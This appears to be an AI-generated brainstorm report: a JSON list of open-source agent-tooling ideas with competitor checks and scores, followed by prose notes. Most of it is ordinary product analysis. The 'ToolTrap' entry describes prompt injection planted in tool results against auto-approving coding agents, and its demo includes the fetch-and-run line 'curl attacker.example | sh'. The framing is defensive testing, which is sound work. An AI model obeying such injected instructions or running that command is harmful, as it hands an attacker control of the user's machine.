```json
{
  "perspective": "What's the full landscape of things one could build? What's adjacent that nobody's naming? Sweeping agent dev-tooling vs. runtime, agent content vs. agent code, meta-layer tools, ports/bridges, single-purpose agents vs. frameworks, local-first vs. SaaS, and developer-experience objects.",
  "ideas": [
    {
      "name": "TarefasBR",
      "pitch": "AgentBench for Brazilian bureaucracy — a growing benchmark of tool-use tasks (NF-e, CPF/CNPJ, boletos, LGPD) that English-first agent evals don't cover.",
      "what_it_does": "A versioned JSONL task set (~150 tasks at launch) plus a small Python CLI (`tarefasbr run`) that points at any tool-calling agent (LangGraph, OpenAI function-calling, an MCP-based agent) and scores it on realistic Brazilian business/consumer tasks: validating a CPF/CNPJ checksum, parsing a boleto barcode, deciding whether a request must be refused under LGPD, filling fields from an NF-e XML. Ships with a static leaderboard page (GitHub Pages) so people can compare model/agent combos on Portuguese business tasks the way Berkeley's Gorilla leaderboard does for general function-calling.",
      "first_run": "pip install tarefasbr && tarefasbr run --agent my_agent.py — no cloud credential required by the harness itself (it needs whatever LLM key the user's own agent already uses); the dataset and scorer run fully offline.",
      "readme_gif": "A terminal recording scrolling through 10 tasks with green/red pass-fail marks and a final score card in Portuguese, ending on a leaderboard table.",
      "who_stars_it": "A Brazilian ML engineer at a fintech (Nubank, Stone, iFood-style) building an internal support agent who is tired of validating tool-use quality by hand in Portuguese.",
      "closest_existing": "Open PT LLM Leaderboard (general Portuguese LLM text benchmark, not agentic/tool-use) and THUDM/AgentBench, https://github.com/THUDM/AgentBench (~2.5k stars, English-only, no Brazilian-specific tasks). No agentic tool-use benchmark grounded in Brazilian bureaucracy found after searching for it directly; BLUEX, ASSIN 2, FaQuAD are reading-comprehension/exam benchmarks, not tool-calling.",
      "why_different": "Existing PT benchmarks test language understanding (exams, Q&A). AgentBench-style tools test tool-use but only in English/US-context tasks. Nothing found tests tool-calling agents against Brazilian-specific structured-data tasks. Genuinely different — until proven otherwise, no direct competitor found.",
      "criteria_scores": {
        "no_credential_60s": "4",
        "demo_sells_itself": "3",
        "own_problem": "3",
        "land_grab_timing": "5",
        "launchable_moment": "3"
      },
      "star_range_12mo": "150-600 — real but small addressable audience (BR AI/fintech devs plus a handful of curious non-BR agent builders wanting a non-English eval); no HN-scale audience for a Portuguese-only benchmark, but very low collision risk keeps it compounding rather than getting buried under near-duplicates.",
      "effort_to_v1": "2-4 weeks",
      "maintenance_shape": "needs sustained maintenance to keep the task set and leaderboard credible, but a frozen v1 with 150 tasks still has standalone value — it doesn't die without daily attention.",
      "biggest_risk": "Audience ceiling: even flawless execution likely caps in the low thousands because it's a niche-language, niche-domain benchmark; a big lab or a Brazilian AI institute could absorb the idea into a broader multilingual eval suite."
    },
    {
      "name": "mcp-behavior-audit",
      "pitch": "Run any installed MCP server through a normal session and get a one-page diff: what it said it does vs. what it actually touched on disk and network.",
      "what_it_does": "A CLI that wraps a target MCP server's stdio process with OS-level tracing (Linux: bpftrace/strace; macOS: dtrace/sandbox-exec logging), runs a normal agent session against it once, and produces a human-readable report comparing the server's declared tool descriptions/scopes against the files, hosts, and subprocesses it actually touched. No enforcement, no persistent sandboxing — a one-shot forensic 'receipt' run before trusting a new MCP server.",
      "first_run": "npx mcp-behavior-audit -- python my_mcp_server.py, then drive a normal session; report prints to terminal and writes audit.html. No cloud credential required — purely local OS tracing.",
      "readme_gif": "Terminal split-pane: left shows a normal Claude Code/OpenClaw session using an MCP server; right shows live syscalls scrolling, ending on a red-highlighted line: 'declared: read-only file access — observed: outbound POST to unknown-host.io'.",
      "who_stars_it": "A developer about to npx a random community MCP server from ClawHub or the official registry into their coding agent, wanting a five-minute trust check before granting it filesystem access.",
      "closest_existing": "facebook/mcpguard-dynamic (eBPF kernel-level proxy — persistent enforcement layer, not a one-shot report); snyk/agent-scan and cisco-ai-defense/mcp-scanner (static analysis + LLM-as-judge, don't actually execute the server); anthropic-experimental/sandbox-runtime (a sandboxing primitive to build on, not an audit report). No tool found that live-traces and diffs against declared scope as a single throwaway command.",
      "why_different": "The nearby tools either prevent (enforce sandboxing) or infer (static/LLM read of the code); none actually run the server once and hand back a plain-English 'it lied about scope X' report. Real but narrow gap — high risk that Facebook's or Anthropic's own teams extend their existing infra to cover this exact report format within months, since the underlying primitives (eBPF trace, sandbox-exec logs) are already built by them.",
      "criteria_scores": {
        "no_credential_60s": "4",
        "demo_sells_itself": "4",
        "own_problem": "4",
        "land_grab_timing": "2",
        "launchable_moment": "3"
      },
      "star_range_12mo": "300-1200 — security-flavored dev tools travel well on HN when the demo GIF has a red 'it lied' moment, but the primitive-owners (Anthropic, Facebook) are one blog post away from shipping the same report format themselves.",
      "effort_to_v1": "2-4 weeks (cross-platform tracing is the hard part; a Linux-only v1 is closer to a weekend)",
      "maintenance_shape": "needs sustained maintenance — OS tracing APIs and MCP transport details (stdio/HTTP/SSE) shift under you.",
      "biggest_risk": "Reliable, low-noise syscall attribution cross-platform (macOS in particular) is genuinely hard engineering; a flaky, false-positive-heavy v1 kills trust in a single bad GIF."
    },
    {
      "name": "repo-trailer",
      "pitch": "Point it at your repo, get back the README GIF everyone tells you to make but nobody has time for.",
      "what_it_does": "Reads your repo's first-run command from the README/package.json/pyproject.toml, spins up a disposable Docker sandbox, drives the command with scripted keystrokes (via Charm's VHS .tape format under the hood), captures terminal output (and optionally a headless-browser screenshot sequence for web apps), and renders a looping, GitHub-size-limit-safe GIF/WebP plus the markdown snippet to paste into your README.",
      "first_run": "npx repo-trailer run from the repo root; asks for the first-run command once, then works fully local except for pulling the sandbox base image. No cloud credential required.",
      "readme_gif": "The tool's own README GIF, recursively generated by itself: a terminal window records another terminal window running npx repo-trailer on a sample repo, ending with the freshly generated GIF file appearing in Finder/VS Code.",
      "who_stars_it": "A solo dev who just finished an OSS side project at 11pm, knows the README needs a GIF to get any traction, and doesn't want to learn VHS's tape-scripting syntax or fight ffmpeg flags.",
      "closest_existing": "charmbracelet/vhs (the underlying terminal-GIF recorder/renderer, well-established and popular) is the primitive this would sit on top of; DeDuckProject/git-glimpse auto-generates video clips of UI diffs specifically for pull requests, not a whole-repo launch demo.",
      "why_different": "VHS requires hand-writing a .tape script describing keystrokes and timing; git-glimpse is scoped to PR-diff UI changes. repo-trailer's job is the orchestration layer — read the repo, infer the first-run command, sandbox it, drive VHS/a headless browser automatically — which neither existing tool does end-to-end. Moderate differentiation: it is very buildable as 'VHS plus a sandbox plus a heuristic,' which is also its risk (trivially cloneable once someone sees the idea work, or VHS itself adds a 'record my repo' subcommand).",
      "criteria_scores": {
        "no_credential_60s": "5",
        "demo_sells_itself": "5",
        "own_problem": "4",
        "land_grab_timing": "2",
        "launchable_moment": "4"
      },
      "star_range_12mo": "400-1500 — a tool whose own demo is its best advertisement tends to do well on launch day (this is the rare idea that satisfies the 'GIF sells it' criterion almost by construction), but VHS's own popularity means the orchestration-wrapper angle is an easy target for a fast clone.",
      "effort_to_v1": "2-4 weeks (sandboxing and command-inference heuristics are the real work; VHS integration is fast)",
      "maintenance_shape": "launch-and-coast is plausible once the core heuristics work, since repos and their first-run commands are the moving target, not the tool itself.",
      "biggest_risk": "'Infer the first-run command automatically' is the hard, unglamorous part and will misfire on a large fraction of real repos, undercutting the point-and-click pitch that is the whole appeal."
    },
    {
      "name": "coderev-local",
      "pitch": "The PR review CodeRabbit gives you, minus CodeRabbit — runs entirely on your machine against a local model, no diff ever leaves your laptop.",
      "what_it_does": "A pre-commit/pre-push git hook plus standalone CLI that sends your staged diff to a locally running Ollama model, gets back inline-style review comments (bugs, missed edge cases, style-guide violations from a config file), and prints them in the terminal or blocks the commit on critical findings. Ships with default prompts tuned for a small local coding model rather than assuming GPT-4-class quality.",
      "first_run": "npx coderev-local init (installs the git hook, checks for a running Ollama, pulls qwen2.5-coder:7b if missing), then git commit triggers it automatically. No cloud credential required; needs Ollama installed locally.",
      "readme_gif": "A terminal shows git commit, the hook kicking in with a spinner, then three inline review comments appearing directly under the diff hunks they refer to, entirely offline (an airplane-mode badge is visible in the recording).",
      "who_stars_it": "An individual developer or small team that wants CodeRabbit/Copilot-review-style feedback on personal or client repos where sending code to a third-party cloud service is a hard no (compliance, contract, or principle).",
      "closest_existing": "No single dominant polished OSS repo found — multiple recent tutorials (Medium, DEV.to, SitePoint, 'Self-Hosted AI Code Review With Ollama: Complete 2026 Guide') show developers building this exact pattern via blog post, but none has consolidated into one well-known packaged tool the way promptfoo or aider have for their categories. Adjacent OSS PR-review agents default to cloud LLMs, not local-only.",
      "why_different": "The pattern is a known 'recipe' (Ollama plus a git hook plus a prompt) that a dozen blog posts teach, but nobody has shipped it as a zero-config, one-command, well-maintained package — a genuinely useful gap, but also genuinely thin: this is the easiest idea on the list to clone, and its simplicity is exactly why several people may ship a near-identical version the same month.",
      "criteria_scores": {
        "no_credential_60s": "4",
        "demo_sells_itself": "4",
        "own_problem": "5",
        "land_grab_timing": "2",
        "launchable_moment": "3"
      },
      "star_range_12mo": "500-2000, high variance — broad appeal (every dev wants this) cuts both ways: it can spike fast on HN, but the low build barrier means several near-identical entrants are likely to split the audience within the same year.",
      "effort_to_v1": "weekend for a rough version; 2-4 weeks to make review quality good enough with a 7B-class local model to not embarrass itself",
      "maintenance_shape": "needs sustained maintenance — local model quality, the Ollama API, and users' style-guide configs all drift.",
      "biggest_risk": "Review quality from a laptop-sized local model is mediocre next to the cloud tools it's positioned against; a few 'this missed an obvious bug' screenshots on HN can kill it in the same launch window that made it."
    },
    {
      "name": "ToolTrap",
      "pitch": "A living, versioned corpus of hidden instructions planted inside tool RESULTS — not prompts — built to catch coding agents that auto-approve their way into disaster.",
      "what_it_does": "A maintained JSONL dataset of adversarial tool-call outputs (a poisoned git log, a malicious file-read result, a booby-trapped API response) each paired with the destructive action a compromised agent should NOT take, plus a thin CLI/GitHub Action that replays them against your agent harness in 'auto-approve' mode and reports which payloads it fell for. Scoped narrowly to the specific, currently under-tested failure mode of autonomous coding agents (OpenClaw, Claude Code, Cursor-agent style) that trust tool output as much as user input.",
      "first_run": "npx tooltrap run --agent-cmd \"my-agent --yolo\" — runs entirely against your own agent binary/harness locally; requires whichever API key your agent already needs, nothing extra.",
      "readme_gif": "A terminal shows an agent running in auto-approve mode reading a poisoned README.md from a 'malicious' fixture repo, then a red banner: 'TRAPPED: agent ran curl attacker.example | sh from instructions hidden in a code comment.'",
      "who_stars_it": "A maintainer of an autonomous coding agent, or a heavy OpenClaw/Claude Code auto-approve user, who wants a five-minute gut-check before turning on YOLO mode for a new project.",
      "closest_existing": "invariantlabs-ai/mcp-injection-experiments, https://github.com/invariantlabs-ai/mcp-injection-experiments (a proof-of-concept snippet collection demonstrating tool-poisoning attacks, not a maintained, growing, versioned benchmark corpus with a runner/scorer); promptfoo's red-team plugins and garak/PyRIT (broad, general-purpose LLM red-teaming, not scoped to autonomous coding-agent auto-approve behavior specifically).",
      "why_different": "The closest match is a snippet repo demonstrating the attack class exists, not a maintained dataset-plus-harness a project can drop into CI and re-run as new payloads are discovered. The scoping — tool results, not prompts, against auto-approve coding agents specifically — is narrower than the general red-teaming tools and matches a very current, very real fear (autonomous agents with shell access) better than they do.",
      "criteria_scores": {
        "no_credential_60s": "4",
        "demo_sells_itself": "4",
        "own_problem": "4",
        "land_grab_timing": "3",
        "launchable_moment": "4"
      },
      "star_range_12mo": "200-800 — security content repos get real, durable attention (garak and PyRIT prove the category works) but this is a narrower slice, so it plausibly lands well below the general-purpose leaders while still outperforming a typical devtool.",
      "effort_to_v1": "2-4 weeks (curating a genuinely dangerous, genuinely realistic fixture corpus is slower than it looks)",
      "maintenance_shape": "needs sustained maintenance — the whole value proposition is 'living,' and a stale corpus is worse than none because it gives false confidence.",
      "biggest_risk": "A general-purpose tool (promptfoo, now under OpenAI, or garak) adds a 'tool-result injection' plugin/probe category and absorbs this niche in one release."
    },
    {
      "name": "agent-lock",
      "pitch": "package-lock.json for agents — pin the exact model snapshot, tool schemas, and seed your agent last ran clean with, and fail CI the moment a provider silently swaps something under a 'latest' alias.",
      "what_it_does": "A CLI that generates an agent.lock file capturing the resolved model snapshot ID (not just the alias), a hash of every tool's JSON schema, and the sampling seed/params for a known-good agent run. A companion CI check re-resolves the alias on a schedule and fails loudly the moment the provider's 'latest' pointer moves to a different snapshot than the one pinned, before that drift silently changes production behavior.",
      "first_run": "npx agent-lock init after a passing run generates agent.lock; npx agent-lock check in CI re-resolves and diffs. Requires whatever provider API key the user's agent already uses to resolve snapshot IDs; no extra credential.",
      "readme_gif": "A terminal shows a green CI check, then a scheduled re-run the next day turning red with 'claude-sonnet-latest resolved to a new snapshot (2026-08-04) — 3 tool-selection tests changed outcome,' linking to the diff.",
      "who_stars_it": "A developer running an agent in production who got burned once by a provider quietly repointing a '-latest' model alias and watching behavior change with no code change on their end.",
      "closest_existing": "arthi-arumugam-git/whatbroke and agentdiff-ai/agentdiff (both diff two runs after the fact, reactive), plus a similar 'EvalView' snapshot-and-diff tool. None frame the problem as a lockfile you commit and a CI gate watching alias resolution specifically, the way package-lock.json or Cargo.lock do for dependencies.",
      "why_different": "The existing tools all answer 'what changed between run A and run B' after you've already noticed something's off. agent-lock's job is narrower and more preventive: catch provider-side alias-to-snapshot drift specifically, before it shows up as a support ticket. It's an honestly incremental wrapper around the same behavior-diffing idea those tools already do well — the differentiation is the lockfile mental model and the scheduled-canary framing, not a fundamentally new capability.",
      "criteria_scores": {
        "no_credential_60s": "3",
        "demo_sells_itself": "3",
        "own_problem": "3",
        "land_grab_timing": "2",
        "launchable_moment": "2"
      },
      "star_range_12mo": "150-500 — a real but narrow pain (production agent operators specifically), and the honest overlap with whatbroke/agentdiff/EvalView means it's competing for the same modest audience three other tools already split.",
      "effort_to_v1": "weekend to 2 weeks (the resolution and hashing logic is small; the value is in the framing, not the code)",
      "maintenance_shape": "launch-and-coast plausible — once the lock/check mechanism works it doesn't need much upkeep beyond adding new providers.",
      "biggest_risk": "It's different enough to write a novel README paragraph about, but not different enough in actual capability from whatbroke/agentdiff to convince someone already using one of those to switch — genuinely borderline on whether it should exist at all."
    },
    {
      "name": "launchcheck",
      "pitch": "Run this on your own OSS repo before you post it to Hacker News — a launch-readiness score calibrated against real launch-day star data, not vibes.",
      "what_it_does": "A CLI that audits a local repo against empirically-grounded launch-readiness signals: does the README have an image/GIF in the first screenful, how many manual steps does the first-run command require, does it detect hard requirements (cloud SDKs, credential env vars) that raise the trial barrier, README length/structure against known high-performing OSS READMEs. Outputs a scored report with the specific line/section to fix, plus a citation to the launch-dynamics research it's calibrated against (e.g., the measured HN launch-day star curve).",
      "first_run": "npx launchcheck run from the repo root; fully local, static analysis of the repo and README, no cloud credential required.",
      "readme_gif": "A terminal shows npx launchcheck scanning a sample repo, printing a scorecard (colored bars per criterion), ending on 'Missing: no GIF or screenshot detected in first 200 lines of README — this is the #1 predictor of HN launch performance.'",
      "who_stars_it": "Any solo OSS maintainer about to submit 'Show HN' for the first time — which, given how many near-identical AI-agent tools surfaced during this research session alone, is an enormous and currently self-aware audience.",
      "closest_existing": "readmecodegen.com's 'README Score Checker' (a web tool scoring generic README completeness/section-presence, not open source and not calibrated against launch-dynamics/star data specifically); matiassingers/awesome-readme (a curated list of good examples, not a scorer). No OSS CLI found that scores launch-readiness against actual star-outcome data rather than generic README completeness.",
      "why_different": "The nearest match checks whether standard README sections exist (installation, license, badges) — documentation-completeness checking. launchcheck's differentiator is being calibrated against what's actually shown to correlate with stars (demo presence, credential-free trial, first-run step count) rather than README hygiene, and being a runnable local CLI rather than a paste-your-text web form.",
      "criteria_scores": {
        "no_credential_60s": "5",
        "demo_sells_itself": "4",
        "own_problem": "5",
        "land_grab_timing": "3",
        "launchable_moment": "5"
      },
      "star_range_12mo": "300-1500 — the audience is self-selected to be exactly the people who share tools on HN/GitHub, so word-of-mouth inside that community is unusually efficient for this one; the ceiling is capped by being a one-shot utility people run once and move on from, not something with daily-use gravity.",
      "effort_to_v1": "weekend to 2 weeks for a useful v1 (mostly heuristics over README/repo structure); more time to make the scoring genuinely well-calibrated rather than superficial",
      "maintenance_shape": "launch-and-coast — the heuristics don't need to change often once written; occasional updates as GitHub/README conventions shift.",
      "biggest_risk": "Without real data behind the scoring, the 'calibrated against launch-day research' claim is easy to assert and hard to actually back with a defensible dataset — it reduces to 'another README linter with a marketing spin,' a much more crowded and less interesting category."
    }
  ],
  "ideas_i_killed": [
    {
      "idea": "Agent trace/replay step-debugger (TUI or web UI showing spans, tool calls, prompts as an interactive tree)",
      "killed_because": "At least six live competitors: Rxflex/agenttrace (github.com/Rxflex/agenttrace), luoyuctl/agenttrace (github.com/luoyuctl/agenttrace, TUI-specific), AgentDebugX (arxiv.org/html/2607.18754, Detect/Attribute/Recover/Rerun loop with CLI+web console), MLflow GenAI tracing (mlflow.org/docs/latest/genai/tracing), Langfuse (langfuse.com, OSS and self-hostable), and Phoenix/OpenInference. This exact idea shape is fully occupied."
    },
    {
      "idea": "Local token/cost profiler with a flamegraph view of agent spend",
      "killed_because": "Crowded: Socialpranker/agentburn (github.com/Socialpranker/agentburn, explicitly local-first, zero-deps, targets OpenClaw/Hermes/Claude Code), eunomia-bpf/agentsight (github.com/eunomia-bpf/agentsight, eBPF system-level profiler with flamegraph support), JingbiaoMei/Tokdash, AgentOps-AI/tokencost, tokenlint/tokenlint-vscode. No gap left."
    },
    {
      "idea": "General prompt-injection / red-team test harness for agents",
      "killed_because": "promptfoo (github.com/promptfoo/promptfoo) has 22,351 stars and was acquired by OpenAI in March 2026; NVIDIA's garak and Microsoft's PyRIT cover the same ground with institutional backing. Not enterable."
    },
    {
      "idea": "Linter/validator for agent skill files (SKILL.md structure, frontmatter, quality)",
      "killed_because": "Six independent competitors found in one search: himself65/skill-lint, Swival/skillscheck, William-Yeh/agent-skill-linter, swarmclawai/agent-skills-lint, thedaviddias/skill-check, agent-ecosystem/skill-validator. This is the single most saturated idea shape found in the entire session."
    },
    {
      "idea": "MCP server security scanner (tool poisoning, credential leaks, RCE detection)",
      "killed_because": "cisco-ai-defense/mcp-scanner, eSentire-Labs/mcp-scanner, snyk/agent-scan, invariantlabs-ai/mcp-injection-experiments, thisisfixer/mcp-scan all cover this directly, several backed by named security vendors (Cisco, Snyk, eSentire)."
    },
    {
      "idea": "Skill/plugin registry or marketplace ('npm for agent skills')",
      "killed_because": "The official modelcontextprotocol/registry exists (near 10K server records by May 2026), openclaw/clawhub is explicitly branded 'npm for AI agents' and is the default registry for the fastest-growing agent runtime in this landscape, and VoltAgent/awesome-openclaw-skills already catalogs 5,400+ skills. First-party and community both own this."
    },
    {
      "idea": "Shareable web replay of an agent session ('asciinema for agents')",
      "killed_because": "es617/claude-replay (github.com/es617/claude-replay) converts Claude Code/Cursor/Codex/Gemini/OpenCode/Kimi sessions into embeddable HTML replays today; a 'Session Viewer' Claude skill and 'Clipy' cover adjacent ground. Plain asciinema itself is already used for this by some (asciinema.org has Claude Code recordings)."
    },
    {
      "idea": "VS Code extension: inspect/debug MCP server tool calls inline",
      "killed_because": "mcpflow/mcp-inspector-vscode, jurgen178/mcp-tool-explorer, microsoft/DebugMCP, hwanyong/mcp-debug-tools all do this."
    },
    {
      "idea": "Sync CLAUDE.md/AGENTS.md/.cursorrules/MCP config across coding agents from one source of truth",
      "killed_because": "At least six competitors: alexandrbasis/claude-agents-sync, amtiYo/agents, dhruv-anand-aintech/agent-rules-sync, spxrogers/agentsync, a 'Sync AI Agent Rules' GitHub Action, and 'Plexus.' Extremely crowded for a niche problem."
    },
    {
      "idea": "TUI/GUI manager to enable/disable installed MCP servers across clients",
      "killed_because": "vlazic/mcp-server-manager (cross-platform single binary with a web UI) and gabrielbacha/MCP-Manager-GUI already do exactly this, though a true terminal-UI (lazydocker-style) variant wasn't found — a thin residual gap, not worth a standalone idea."
    },
    {
      "idea": "Chaos engineering for AI agents (inject tool timeouts, malformed JSON, rate limits into test runs)",
      "killed_because": "deepankarm/agent-chaos is a direct, well-scoped match (LLM failures, tool failures, data corruption injectors, integrates with DeepEval/Pydantic Evals) and iroy2000/langchain-chaos-middleware covers the LangChain-specific slice."
    },
    {
      "idea": "'git blame' for AI-authored code — track which model/agent wrote which line",
      "killed_because": "mesa-dot-dev/agentblame and usegitai.com's 'Git AI / Agent Blame' both do line-level AI attribution surviving rebases and merges."
    },
    {
      "idea": "Diff tool for agent behavior when swapping models or editing prompts",
      "killed_because": "arthi-arumugam-git/whatbroke and agentdiff-ai/agentdiff both do this directly, plus a third similar 'EvalView' tool. (Left a narrower, honestly-incremental slice alive as 'agent-lock' above, flagged as borderline.)"
    },
    {
      "idea": "AI-slop / over-engineering linter for agent-generated code",
      "killed_because": "flamehaven01/ai-slop-detector, rsionnach/sloppylint, and JordanGunn/agent-slop-lint all exist and cover exactly this ground (empty functions, fake docs, hallucinated imports, dead code, oversized functions) — notably close to this very project's own CLAUDE.md philosophy, but already built by others."
    },
    {
      "idea": "Auto-generate an architecture diagram from any GitHub repo",
      "killed_because": "ahmedkhaleel2004/gitdiagram is a well-established, 100%-open-source tool doing exactly this (github.com/ahmedkhaleel2004/gitdiagram), with a public hosted version at gitdiagram.com."
    },
    {
      "idea": "MCP tool-description quality/confusability scanner using embeddings",
      "killed_because": "Stacklok's mcp-tef, sameenchand/mcpx, a 'ToolRank' GitHub Action, and Portkey-AI/mcp-tool-filter all score or filter MCP tool definitions for clarity/overlap already — this specific idea, which felt like a genuine gap from the academic literature (MCP-Bench, HumanMCP), turned out to already have practical OSS implementations."
    }
  ],
  "critique_of_the_criteria": "Two things this sweep surfaced that the five criteria don't account for. First, the criteria describe a single, very specific idea shape (npx-runnable, GIF-demoable, individual pain, unclaimed surface, launch moment) — and this session found that shape has already been built, rebuilt, and rebuilt again for nearly every plausible agent-tooling niche: six SKILL.md linters, five MCP security scanners, five token-cost profilers, six CLAUDE.md/AGENTS.md sync tools, four MCP tool-description scanners, three agent-behavior-diff tools. If the criteria are genuinely the optimal playbook, then everyone applying them converges on the same handful of idea shapes at once, and 'land-grab timing' (criterion 4) becomes self-defeating: the more correct the playbook, the faster any given surface gets claimed by simultaneous independent builders, not just incumbents. The wide sweep suggests the MCP-tooling land-grab window that opened when MCP launched has already closed — most of it was claimed within the same few months, not years. Second, criterion 2 ('a GIF or screenshot that sells it') and criterion 3 ('own problem') systematically favor visual, individual-developer tools over content — but this session's single strongest, least-contested find (TarefasBR) is a dataset/benchmark serving an underserved audience (non-English speakers), which scores weakly on both those criteria yet has a real, durable path to stars through citation and adoption rather than a launch spike. The five criteria are well-tuned for launch-day virality; they have no slot for the slower, more defensible 'underserved audience with real unmet need' path, which given how saturated the fast-launch path now is, may be the more realistic route for a careful, non-hype-shipping builder.",
  "top_pick": "TarefasBR. Every other idea on this list, and nearly every idea killed in the research, competes in a devtool category that turned out to already have two-to-six live entrants by the time this search was run — the 'land-grab' window on agent dev-tooling appears to have already closed. TarefasBR is the one idea in this sweep where a real search for a direct competitor came up empty, and its moat isn't cleverness, it's an unclonable asset: native fluency in Brazilian Portuguese and (presumably) firsthand familiarity with Brazilian business/bureaucratic tasks that an English-first competitor cannot credibly replicate quickly. It's content-first rather than launch-spike-first, which fits a careful engineer better than a growth-hacky product — good benchmarks accrue stars through citation and adoption, not sustained personal-brand marketing, which matches the stated discomfort with hype-shipping. Its ceiling is honestly modest (150-600 in 12 months), but it's the most defensible modest outcome on the list, with the clearest route to compounding rather than getting drowned out.",
  "schema_version": 3
}
```

# Wide Judge — Brainstorm Notes

## What this sweep actually found

The brief was to map the full option space and name what's adjacent that nobody's naming. What actually happened: nearly every "adjacent" idea I generated across seven categories (dev tooling, meta-layer, ports/bridges, content, DX objects, local-first SaaS alternatives, single-purpose agents) turned out to already exist, usually with two to six independent competitors, when checked against live search. This is itself the headline finding of the "Wide" angle — not a list of gaps, but a demonstration of how thin the remaining gaps actually are as of mid-2026.

Fifteen ideas were killed with a named competitor and URL (see `ideas_i_killed` above). A few patterns in what's saturated:

- **Anything shaped like "linter/scanner/dashboard for MCP servers or agent skills"** is gone. MCP launched, and within months the tooling around it — registries, security scanners, tool-quality scanners, VS Code inspectors, server managers — was built multiple times over, often by named security vendors (Cisco, Snyk, eSentire) or the protocol's own maintainers.
- **Anything shaped like "observability/tracing/cost dashboard for agent runs"** is gone. At least five separate token-cost profilers and five separate trace/replay debuggers exist, several explicitly local-first and explicitly targeting the same runtimes (OpenClaw, Claude Code, Hermes).
- **OpenClaw's rise has already spawned its own dense sub-ecosystem** — a skill marketplace ("npm for AI agents," their own words), multi-agent orchestration kits, session-sharing tools — faster than this council could brainstorm around it.

## The ideas that survived

Seven ideas made the cut, and I've tried to be honest rather than generous about how differentiated each one really is:

- **TarefasBR** and **ToolTrap** are content/dataset plays — the category the brief specifically asked me to check, and the one place a real gap turned up (see below).
- **mcp-behavior-audit** and **repo-trailer** are genuine, if narrow, wedges next to well-funded adjacent tools (Facebook's eBPF sandbox, Anthropic's sandbox-runtime, Charm's VHS) — the differentiation is real but thin enough that the incumbents could absorb it in a release.
- **coderev-local** and **launchcheck** are cases where the _pattern_ is well-known (a dozen blog posts teach the Ollama-hook trick; several README scorers exist) but no single polished, well-known OSS package has consolidated it — a real but perishable window, since low build cost means low defensibility.
- **agent-lock** is the most marginal entry — I kept it in the main list rather than the kill list because its framing (lockfile + CI gate, borrowed from package managers) is genuinely distinct from the reactive diff tools it sits next to, but I want to flag directly: this is the idea on the list I'm least sure deserves to exist as a separate project rather than a feature request against `whatbroke` or `agentdiff`.

## The one real gap: language and audience, not code shape

The single cleanest result from this whole sweep was **TarefasBR** — an agentic (not just textual) benchmark grounded in Brazilian bureaucratic and business tasks. General Portuguese LLM benchmarks exist (Open PT LLM Leaderboard, BLUEX, ASSIN 2, FaQuAD), and general agent tool-use benchmarks exist (AgentBench, MCP-Bench, HumanMCP), but nothing found sits at their intersection. That's not because the intersection is hard to think of — it's because almost nobody building agent tooling right now is thinking in Portuguese first. That's a genuine, if narrow, land grab, and it's the one idea on this list built on an asset (native language + domain fluency) that a fast-moving English-speaking competitor can't simply out-code.

## Why the criteria need a caveat

The packet's five criteria (60-second no-credential run, GIF-sellable demo, own problem, land-grab timing, launchable moment) are a coherent playbook — and that's exactly the problem this sweep exposed. If the playbook is right, everyone applying it converges on the same idea shapes at the same time, which is a plausible mechanical explanation for why every "obvious" wedge (MCP linter, skill scanner, cost dashboard) already has three to six near-simultaneous independent implementations. The criteria are tuned for a launch-day star spike; they have no slot for the slower, citation-driven path that content/benchmark repos take, which is precisely the path the one uncontested idea in this sweep (TarefasBR) would need to walk.
